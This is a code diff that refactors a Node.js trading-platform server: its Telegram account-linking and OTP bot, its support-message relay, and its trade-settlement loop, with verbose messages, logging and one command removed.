-                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot, protecting your assets with bank-grade encryption.\n\n*Available Commands (Tap to select):*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View all connected profiles.\n💬 /help - Open a direct support session.`);
+                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\nPlease end the active session first using /endhelp.`); continue; }
+                                await sendTelegramMessage(chatId, `✨ *WELCOME TO ICTEX SECURE GATEWAY* ✨\n\nHello Trader! I am the official ICTEX Security and 2FA Bot.\n\n*Available Commands:*\n🔑 /linkictex - Link account securely.\n👤 /accounts - View linked profiles.\n💬 /help - Open a direct support session.`);
                             } 
                             else if (textLower === '/linkictex') {
-                                if (activeSupportSessions[chatId]) {
-                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
-                                    continue;
-                                }
-
+                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ Please end the active help session first using /endhelp.`); continue; }
                                 if (activeLinkingSessions[chatId]) {
                                     clearTimeout(activeLinkingSessions[chatId].timeoutRef);
-                                    if (activeLinkingSessions[chatId].linkMessageId) {
-                                        deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
-                                    }
+                                    if (activeLinkingSessions[chatId].linkMessageId) deleteTelegramMessage(chatId, activeLinkingSessions[chatId].linkMessageId);
                                 }
-                                
-                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\n\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\`\n\n_Note: You have exactly 1 minute to submit your code before this session expires._`);
-                                
+                                const linkMessageId = await sendTelegramMessage(chatId, `🔑 *ICTEX Secure Account Link Initiation*\nPlease go to your **ICTEX Trading Terminal -> Profile Settings**, copy your 15-digit secure linking code, and paste it here.\n\n*Code format:* \`XXXXX - XXXXX - XXXXX\``);
                                 activeLinkingSessions[chatId] = {
                                     linkMessageId: linkMessageId,
                                     expiresAt: Date.now() + 60000,
                                     timeoutRef: setTimeout(async () => {
-                                        // ১ মিনিট শেষ হলে মূল লিংক রিকোয়েস্ট মেসেজটি ডিলিট করা
-                                        if (linkMessageId) {
-                                            deleteTelegramMessage(chatId, linkMessageId);
-                                        }
-                                        
-                                        // এক্সপায়ার্ড নোটিফিকেশন পাঠানো
-                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\n\nYour 1-minute account linking session has expired. Please type /linkictex to initiate a new secure pairing session.`);
-                                        
-                                        // এক্সপায়ার্ড মেসেজটি ১০ সেকেন্ড পর মুছে ফেলা
-                                        setTimeout(() => {
-                                            if (expiredMessageId) {
-                                                deleteTelegramMessage(chatId, expiredMessageId);
-                                            }
-                                        }, 10000);
-                                        
+                                        if (linkMessageId) deleteTelegramMessage(chatId, linkMessageId);
+                                        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ *Linking Session Expired*\nYour 1-minute account linking session has expired. Type /linkictex to start again.`);
+                                        setTimeout(() => { if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000);
                                         delete activeLinkingSessions[chatId];
                                     }, 60000)
                                 };
                             }
-                            else if (textLower === 'my accounts' || textLower === '/accounts') {
-                                if (activeSupportSessions[chatId]) {
-                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
-                                    continue;
-                                }
-
-                                try {
-                                    const usersSnap = await db.ref('users').once('value');
-                                    const users = usersSnap.val() || {};
-                                    const matchedAccounts = [];
-                                    
-                                    for (const [uid, u] of Object.entries(users)) {
-                                        if (u && u.telegramChatId == chatId) {
-                                            matchedAccounts.push({
-                                                email: u.email,
-                                                name: u.nickname || u.name || 'Trader',
-                                                numericId: u.numericId || uid.substring(0, 8)
-                                            });
-                                        }
-                                    }
-                                    
-                                    if (matchedAccounts.length > 0) {
-                                        let reply = `👤 *Your Linked ICTEX Accounts:*\n\n`;
-                                        matchedAccounts.forEach((acc, idx) => {
-                                            reply += `${idx + 1}. *${acc.name}* (ID: \`${acc.numericId}\`) - ${acc.email}\n`;
-                                        });
-                                        await sendTelegramMessage(chatId, reply);
-                                    } else {
-                                        await sendTelegramMessage(chatId, `❌ *No linked accounts found.*\n\nPlease link your ICTEX account by pasting your secure linking code.`);
-                                    }
-                                } catch (err) {
-                                    console.error("Error fetching linked accounts:", err);
-                                    await sendTelegramMessage(chatId, `❌ *Error fetching your accounts.* Please try again later.`);
-                                }
-                            }
                             else if (textLower === '/help') {
-                                if (activeSupportSessions[chatId]) {
-                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nYou are already in an active support session. Describe your query or close it using /endhelp.`);
-                                    continue;
-                                }
+                                if (activeSupportSessions[chatId]) { await sendTelegramMessage(chatId, `⚠️ You are already in an active support session.`); continue; }
                                 activeSupportSessions[chatId] = { active: true, isFirstMessage: true };
-                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\n\nYou are now connected to the Support Desk. Please describe your problem in detail, and our support agents will assist you shortly.\n\n*Supported languages:* Bangla, English, Urdu, Hindi, Arabic, Chinese, Japanese, and others.\n\n🔒 _Once your issue is resolved, tap /endhelp to close the session._`);
+                                await sendTelegramMessage(chatId, `💬 *ICTEX Help Desk Started*\nYou are now connected to the Support Desk. Please describe your problem in detail.\n\n🔒 _Tap /endhelp to close the session._`);
                             }
-                            else if (textLower === '/endhelp' || textLower === '/end' || textLower === '/endhlp') {
+                            else if (textLower === '/endhelp' || textLower === '/end') {
                                 if (activeSupportSessions[chatId]) {
                                     delete activeSupportSessions[chatId];
-                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*\n\nYour support session has been closed successfully. Standard gateway commands are now unlocked.\n\n🔑 /linkictex - Start Account Pairing\n👤 /accounts - View Linked Profiles\n💬 /help - Open New Help Session`);
-                                } else {
-                                    await sendTelegramMessage(chatId, `✨ *ICTEX Gateway Core* ✨\n\nNo active support session was found. Use the commands below:\n\n🔑 /linkictex - Link account securely\n👤 /accounts - Connected profiles\n💬 /help - Start live help support`);
+                                    await sendTelegramMessage(chatId, `🔒 *SUPPORT SESSION CLOSED*`);
                                 }
                             }
                             else {
-                                // সাপোর্ট সেশন সক্রিয় থাকলে মেসেজ ফরওয়ার্ড এবং অটো-রিপ্লাই প্রসেস করা
                                 if (activeSupportSessions[chatId] && activeSupportSessions[chatId].active) {
                                     if (activeSupportSessions[chatId].isFirstMessage) {
                                         activeSupportSessions[chatId].isFirstMessage = false;
-                                        
-                                        // বাংলিশ ও হিংলিশ সহ মাল্টি-ল্যাঙ্গুয়েজ ডিটেকশন লজিক
-                                        const isBangla = /(amar|shomosha|hoice|koro|hobe|ami|keno|bhalo|bhlo|din|dite|parben|korte|সমস্যা|সাহায্য|আইডি|হয়েছে)/i.test(text);
-                                        const isHindi = /(pe|ek|hua|hain|mera|problem|mujhe|kab|dikkat|hai|huya|मদদ|समस्या|हुआ)/i.test(text);
-                                        
-                                        if (isBangla) {
-                                            await sendTelegramMessage(chatId, `অনুগ্রহ করে অপেক্ষা করুন, খুব দ্রুত আপনার সাথে যোগাযোগ করা হবে।`);
-                                        } else if (isHindi) {
-                                            await sendTelegramMessage(chatId, `कृपया प्रतीक्षा करें, जल्द ही आपसे संपर्क किया जाएगा।`);
-                                        } else {
-                                            await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
-                                        }
+                                        await sendTelegramMessage(chatId, `Please wait, our support agents will contact you shortly.`);
                                     }
-                                    
-                                    // ওনার অ্যাকাউন্টে মেসেজটি ফরওয়ার্ড করা
                                     const forwardedId = await forwardTelegramMessage(ADMIN_OWNER_ID, chatId, update.message.message_id);
-                                    if (forwardedId) {
-                                        adminSupportMap[forwardedId] = chatId; // ট্র্যাকিং ম্যাপে রাখা
-                                    }
+                                    if (forwardedId) adminSupportMap[forwardedId] = chatId;
                                 }
                                 else {
-                                    // ওটিপি লিংক প্রসেস সক্রিয় থাকলে কোড ভেরিফাই করা
                                     const session = activeLinkingSessions[chatId];
                                     if (session && Date.now() < session.expiresAt) {
                                         const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
@@ -882,127 +532,58 @@ function pollTelegramUpdates() {
                                             const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                             if (linkSnap.exists()) {
                                                 const uid = linkSnap.val().uid;
-                                                await db.ref(`users/${uid}`).update({
-                                                    telegramChatId: chatId,
-                                                    twoFactorEnabled: true
-                                                });
+                                                await db.ref(`users/${uid}`).update({ telegramChatId: chatId, twoFactorEnabled: true });
                                                 await linkSnap.ref.remove();
-                                                
                                                 clearTimeout(session.timeoutRef);
-                                                if (session.linkMessageId) {
-                                                    deleteTelegramMessage(chatId, session.linkMessageId);
-                                                }
+                                                if (session.linkMessageId) deleteTelegramMessage(chatId, session.linkMessageId);
                                                 delete activeLinkingSessions[chatId];
-                                                
-                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\n\nCongratulations! Your Telegram profile is now fully bound to your ICTEX Trading Account.\n\n🔒 *Security Features Enabled:*\n• 2FA Login Challenge Alerts\n• Real-Time Withdrawal OTP Alerts\n• Automated Terminal Re-authorizations\n\n_Your account is now guarded by our secure trading network._`);
+                                                await sendTelegramMessage(chatId, `🎉 *ACCOUNT PAIRED SUCCESSFULLY!* 🎉\nYour Telegram profile is now fully bound to your ICTEX Trading Account.`);
                                             } else {
-                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED* ❌\n\nThe linking code you provided is invalid, has expired, or has already been used.\n\n*What to do next:*\n1. Open your terminal settings.\n2. Generate a fresh 15-digit linking code.\n3. Type /linkictex to start a new pairing session, then paste the code instantly.`);
+                                                await sendTelegramMessage(chatId, `❌ *PAIRING ATTEMPT FAILED*\nThe linking code is invalid or expired.`);
                                             }
-                                        } else {
-                                            await sendTelegramMessage(chatId, `❌ *Format Mismatch*\n\nThe code you entered does not match the 15-character linking code format (\`XXXXX - XXXXX - XXXXX\`). Please paste the code exactly as shown in your terminal.`);
-                                        }
-                                    } else {
-                                        // সাধারণ পরিস্থিতিতে পাঠানো প্রিমিয়াম গাইড মেসেজ (Unsolicited Message Notice)
-                                        await sendTelegramMessage(chatId, `ℹ️ *SYSTEM NOTICE: SUPPORT DESK INACTIVE*\n\nTo speak directly with our support agents, you must initialize a support session:\n\n💬 Tap /help to turn on live support chat.\n\n🔒 Once your conversation is completed, remember to close the session by tapping /endhelp.`);
-                                    }
+                                        } 
+                                    } 
                                 }
                             }
                         }
                     }
                 }
-            } catch(e) { console.error("Polling parse error:", e); }
+            } catch(e) {}
             setTimeout(pollTelegramUpdates, 1000); 
         });
-    }).on('error', (e) => {
-        console.error("Polling connection error:", e);
-        setTimeout(pollTelegramUpdates, 3000);
-    });
+    }).on('error', () => { setTimeout(pollTelegramUpdates, 3000); });
 }
 
 function deleteTelegramWebhook() {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`;
-    https.get(url, (res) => {
-        res.resume(); // রেসপন্স ডেটা কনজিউম করে সকেট ফ্রি করা হলো
-        console.log("Telegram webhook deleted for clean polling.");
-        pollTelegramUpdates();
-    }).on('error', (e) => {
-        console.error("Error deleting webhook, starting polling anyway:", e);
-        pollTelegramUpdates();
-    });
+    https.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`, (res) => {
+        res.resume(); pollTelegramUpdates();
+    }).on('error', () => { pollTelegramUpdates(); });
 }
 deleteTelegramWebhook();
 
-// Track active OTP transmissions for premium self-destruction
 const activeOtps = {};
-
 async function handleNewOtp(uid, chatId, otp, userName) {
-    // নতুন ওটিপি পাঠানোর সময় আগের ওটিপি মেসেজটি থাকলে তা চ্যাট থেকে ডিলিট করে দেওয়া হবে
     if (activeOtps[uid]) {
         if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
-        if (activeOtps[uid].otpMessageId) {
-            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
-        }
+        if (activeOtps[uid].otpMessageId) deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
         delete activeOtps[uid];
     }
-
-    const premiumOtpText = `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\n\nYour secure verification code is:\n\n\`${otp.code}\`\n\n_This code will expire in 60 seconds. Do not share this transmission._`;
-    
-    const otpMessageId = await sendTelegramMessage(chatId, premiumOtpText);
-    
-    activeOtps[uid] = {
-        code: otp.code,
-        chatId,
-        otpMessageId,
-        expiresAt: otp.expiresAt
-    };
-
-    const duration = 60000;
-
-    activeOtps[uid].timeoutRef = setTimeout(async () => {
-        const expiredText = `⚠️ *Security Code Expired*\n\nThe verification code \`${otp.code}\` for *${userName}* has expired. Please request a new one from your terminal.`;
-        const expiredMessageId = await sendTelegramMessage(chatId, expiredText);
-
-        // ১০ সেকেন্ড পর ওটিপি মেসেজ এবং এক্সপায়ার নোটিফিকেশন দুটিই চ্যাট থেকে মুছে ফেলার টাইমার
-        setTimeout(() => {
-            if (otpMessageId) {
-                deleteTelegramMessage(chatId, otpMessageId);
-            }
-            if (expiredMessageId) {
-                deleteTelegramMessage(chatId, expiredMessageId);
-            }
-        }, 10000); 
-
+    const otpMessageId = await sendTelegramMessage(chatId, `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\nYour code is: \`${otp.code}\`\n\n_Expires in 60s._`);
+    activeOtps[uid] = { code: otp.code, chatId, otpMessageId, expiresAt: otp.expiresAt, timeoutRef: setTimeout(async () => {
+        const expiredMessageId = await sendTelegramMessage(chatId, `⚠️ Code expired.`);
+        setTimeout(() => { if (otpMessageId) deleteTelegramMessage(chatId, otpMessageId); if (expiredMessageId) deleteTelegramMessage(chatId, expiredMessageId); }, 10000); 
         db.ref(`users/${uid}/pendingOTP`).remove().catch(() => {});
         delete activeOtps[uid];
-    }, duration);
+    }, 60000) };
 }
-
-// Watch pendingOTP node creation across all users
-db.ref('users').on('child_changed', (snapshot) => {
-    const uid = snapshot.key;
-    const user = snapshot.val();
+db.ref('users').on('child_changed', (snap) => {
+    const user = snap.val();
     if (user && user.pendingOTP && user.telegramChatId) {
-        const otp = user.pendingOTP;
-        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
-            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
-        }
-    } else if (user && !user.pendingOTP && activeOtps[uid]) {
-        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
-        if (activeOtps[uid].otpMessageId) {
-            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
-        }
-        delete activeOtps[uid];
-    }
-});
-
-db.ref('users').on('child_added', (snapshot) => {
-    const uid = snapshot.key;
-    const user = snapshot.val();
-    if (user && user.pendingOTP && user.telegramChatId) {
-        const otp = user.pendingOTP;
-        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
-            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
-        }
+        if (!activeOtps[snap.key] || activeOtps[snap.key].code !== user.pendingOTP.code) handleNewOtp(snap.key, user.telegramChatId, user.pendingOTP, user.name || 'User');
+    } else if (user && !user.pendingOTP && activeOtps[snap.key]) {
+        if (activeOtps[snap.key].timeoutRef) clearTimeout(activeOtps[snap.key].timeoutRef);
+        if (activeOtps[snap.key].otpMessageId) deleteTelegramMessage(activeOtps[snap.key].chatId, activeOtps[snap.key].otpMessageId);
+        delete activeOtps[snap.key];
     }
 });
 
@@ -1029,10 +610,7 @@ setInterval(async () => {
                     continue;
                 }
 
-                // Fix: Capture the exact live price at the moment the trade timer ends, 
-                // rather than waiting for the entire candle to close, ensuring chart matches history perfectly.
                 let closingPrice = marketData.currentPrice;
-
                 if (closingPrice === null || typeof closingPrice !== 'number') continue;
 
                 let result, payout, profitChange;
@@ -1058,13 +636,10 @@ setInterval(async () => {
                 }
                 
                 const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
-                
                 allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
                 allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };
 
-                // Update balances for non-demo trades
                 if (!trade.isDemo && !trade.isTournament) {
-                    // ✅ Normal Trading uses Real/Bonus Wallet
                     if (result === 'win') {
                         allMarketUpdates[`users/${trade.uid}/realBalance`] = firebase.database.ServerValue.increment(payout);
                     } else if (result === 'push') {
@@ -1075,20 +650,17 @@ setInterval(async () => {
                     allMarketUpdates[`users/${trade.uid}/dailyProfit`] = firebase.database.ServerValue.increment(profitChange);
                 }
 
-                // Cleanup active trades
                 allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                 allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
-
-                console.log(`[ARBITER] Resolved trade ${tradeId} for user ${trade.uid}. Result: ${result}`);
             }
         }
     }
 
     if (Object.keys(allMarketUpdates).length > 0) {
-        db.ref().update(allMarketUpdates).catch(e => console.error("Arbiter update failed:", e));
+        db.ref().update(allMarketUpdates).catch(()=>{});
     }
 }, 2000);
 
-app.get('/ping', (_req, res) => res.send('Server V30.2 - Perfect Wick Dynamics Active'));
+app.get('/ping', (_req, res) => res.send('Server V30.3 - Quotex Style Candles Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
